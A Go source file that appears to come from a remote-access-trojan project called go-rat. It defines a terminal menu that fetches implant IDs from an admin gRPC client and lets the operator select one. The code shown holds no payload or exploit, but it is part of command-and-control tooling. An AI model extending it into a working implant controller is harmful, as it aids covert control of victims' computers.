package main

import (
	"context"
	"fmt"
	"os"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/charmbracelet/lipgloss/list"
	"github.com/iortego42/go-rat/grpcapi"
	"github.com/iortego42/go-rat/log"
)

var logger = log.InitLogger()

var ITEMSTYLE lipgloss.Style = lipgloss.NewStyle().
	// Border(lipgloss.NormalBorder()).
	// BorderForeground(lipgloss.Color("#9fe0f0")).
	Foreground(lipgloss.NoColor{})

var SELECTORSTYLE lipgloss.Style = lipgloss.NewStyle().
	Foreground(lipgloss.Color("#9fe0f0")).
	Bold(true)

	// Padding(1)

type menu struct {
	Elements []string
	Cursor   int
	Chosen   bool
	Quiting  bool
}

func initMenu(elements []string, cursor int) menu {
	return menu{
		Elements: elements,
		Cursor:   cursor,
		Chosen:   false,
		Quiting:  false,
	}
}

func (m menu) Init() tea.Cmd {
	return nil
}

func (m menu) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c", "q":
			m.Quiting = true
			return m, tea.Quit
		case "up", "k":
			if m.Cursor > 0 {
				m.Cursor--
			}
		case "down", "j":
			if m.Cursor < len(m.Elements)-1 {
				m.Cursor++
			}
		case "enter":
			m.Chosen = true
			return m, tea.Quit
		}
	}
	return m, nil
}

func (m menu) View() string {
	if m.Quiting || m.Chosen {
		return ""
	}
	l := list.New(m.Elements)
	l.ItemStyle(ITEMSTYLE)
	l.EnumeratorStyle(SELECTORSTYLE)
	l = l.Enumerator(m.selector)
	return fmt.Sprintln(l)
}

func (m menu) selector(items list.Items, i int) string {
	if i == m.Cursor {
		return "|> "
	}
	return ""
}

func implantsMenu(client grpcapi.AdminClient) string {
	var (
		m     menu
		ctx   = context.Background()
		items []string
	)

	availableImplants, err := client.GetImplants(ctx, nil)
	if err != nil {
		logger.Fatal(err)
	}
	for _, v := range availableImplants.Implants {
		logger.Debug(v.Id)
		items = append(items, v.Id)
	}
	logger.Debug(items)
	p := tea.NewProgram(initMenu(items, 0))
	_m, err := p.Run()
	if err != nil {
		logger.Fatal("There was an error on menu", "menu", err)
	}
	m, ok := _m.(menu)
	if !ok {
		logger.Fatal("Error at the end of menu")
	}
	if m.Quiting {
		logger.Info("Quiting.")
		os.Exit(1)
	}
	return m.Elements[m.Cursor]
}
